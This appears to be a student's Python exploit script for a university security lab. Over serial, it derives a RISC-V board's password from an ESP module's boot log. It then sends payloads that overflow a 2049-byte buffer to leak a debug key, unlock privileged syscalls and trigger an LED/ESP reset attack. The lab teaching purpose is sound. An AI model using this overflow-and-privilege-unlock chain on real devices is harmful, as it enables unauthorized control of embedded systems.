
#  * @author [Keerthana Laxmish]
#  * @email  [k.laxmish@campus.tu-berlin.de]
#  * @create date 2022-11-06 
#  * @modify date 2022-12-04 
#  * @description [Assignment 3 Unlocking Priviledged Syscalls]

import os
import subprocess
import serial
import time

# Strings for checks
bootlog_check = "sta_mac: ".encode('utf-8')
welcome = "Welcome.\r\n".encode('utf-8')
password = "__SecLab__".encode('utf-8')
lastword = "Tetris".encode('utf-8')
debug_key_check = "What do you want to play?".encode('utf-8')

# Open serial communication to RISCV
riscv = serial.Serial(port = '/dev/ttyACM0', baudrate= 115200, bytesize=8,timeout=20,stopbits=serial.STOPBITS_ONE)

# Reset RISCV
os.system('echo "rnh" | JLinkExe -device FE310 -if JTAG -speed 4000 -jtagconf -1,-1 -autoconnect 1')
print("RISCV connected")

# Reset ESP and check for MAC address line on bootlog file
print("Resetting ESP")
esp = serial.Serial(port = '/dev/ttyACM1', baudrate= 115200, bytesize=8, timeout=1 ,stopbits=serial.STOPBITS_ONE)
esp.dtr = 0
time.sleep(0.1)
esp.rts = 0
while esp.isOpen() :
  temp = esp.readline()
  if bootlog_check in temp:
    break 
esp.close()

# Extract password from bootlog line
mac_add = temp.split(bootlog_check,1)[1]
password = password + mac_add[:17]

# Read and enter password
print(riscv.read_until(welcome).decode().rstrip())
time.sleep(0.5)
riscv.write(bytes(password))
time.sleep(1)
response = riscv.read_until(lastword)
print(response.decode().rstrip())
time.sleep(0.5)

# CUSTOM GAME ITERATION 1
riscv.write("l".encode('utf-8'))
print(riscv.read_until('?').decode().rstrip())

# Send size of game
riscv.write(bytes.fromhex('00000800'))

# Generate .c , .asm , .o ,.hex files for payload1
process1 = subprocess.call(['./payload1/makefile_p1.sh'])
time.sleep(0.5)
with open(os.path.join('./payload1','payload1.hex'), 'r') as payload1: hack_syscall = payload1.read()
# PUTSTR_SYSCALL,# EXIT SYSCALL
hack_syscall = bytes.fromhex(hack_syscall)
riscv.write(hack_syscall)

# Fill buffer
buffer_rem_size = 2049 - len(hack_syscall)
for i in range(buffer_rem_size):
  riscv.write(bytes.fromhex('41')) # flooding buffer with A

# Extract Debug Key from console  
while True :
  temp = riscv.readline().rstrip()
  if debug_key_check in temp:
    a = bytes.fromhex((temp.hex()[0:8]))[::-1].hex()
    debug_key= int(a,16)
    break 

# Set Stack Size
stack_size = 0x0

# Generate .c , .asm , .o ,.hex files for payload2
with open(os.path.join('./payload2','template.c'), 'r') as original: data = original.read()
with open(os.path.join('./payload2','payload2.c'), 'w') as modified: modified.write("#define debug_key "+ str(debug_key) + "\n"+"#define stack_size "+ str(stack_size) + "\n" + data)
process2 = subprocess.call(['./payload2/makefile_p2.sh'])
	
time.sleep(0.5)	

# CUSTOM GAME ITERATION 2
riscv.write("l".encode('utf-8'))
time.sleep(0.1)
# Send size of game
riscv.write(bytes.fromhex('00000800'))

# UNLOCK_SYSCALL,# SET_STACK_SIZE_SYSCALL , #GET_STACK_BOTTOM_SYSCALL, # EXIT_SYSCALL
with open(os.path.join('./payload2','payload2.hex'), 'r') as payload2: unlock_syscall = payload2.read()
priv_syscall = bytes.fromhex(unlock_syscall)
riscv.write(priv_syscall)

# Fill buffer
buffer_rem_size = 2049 - len(priv_syscall)
for i in range(buffer_rem_size):
  riscv.write(bytes.fromhex('42')) # flooding buffer with B
  
time.sleep(0.5)	

# CUSTOM GAME ITERATION 3
riscv.write("l".encode('utf-8'))
time.sleep(0.1)
# Send size of game
riscv.write(bytes.fromhex('00000800'))  

# process3 = subprocess.call(['./payload3/makefile_p3.sh'])
# code = ""
# with open(os.path.join('./payload3','payload3.o'), 'r') as binary:
# 	lines = binary.readlines()
# 	for i in lines:
# 		if(i!=lines[0]):
# 			code = code+((str(i).replace(" ","")).replace("\n",""))
#with open(os.path.join('./payload3','payload3.hex'), 'w') as final_hex: final_hex.write(code)	

# Payload for LED control + ESP Reset
print("ESP Reset attack")
with open(os.path.join('./payload3','payload3.hex'), 'r') as payload3: led_syscall = payload3.read()
ledpriv_syscall = bytes.fromhex(led_syscall)
riscv.write(ledpriv_syscall)

# Fill buffer
buffer_rem_size = 2049 - len(ledpriv_syscall)
for i in range(buffer_rem_size):
  riscv.write(bytes.fromhex('43')) # flooding buffer with C
  
# # Extract Stack_End_Address from console  
# while True :
#   temp = riscv.readline().rstrip()
#   if debug_key_check in temp:
#     stack_end = bytes.fromhex((temp.hex()[0:8]))[::-1].hex()
#     break
#   print(temp.decode())   	
time.sleep(10)
print("\nExiting")
riscv.close()
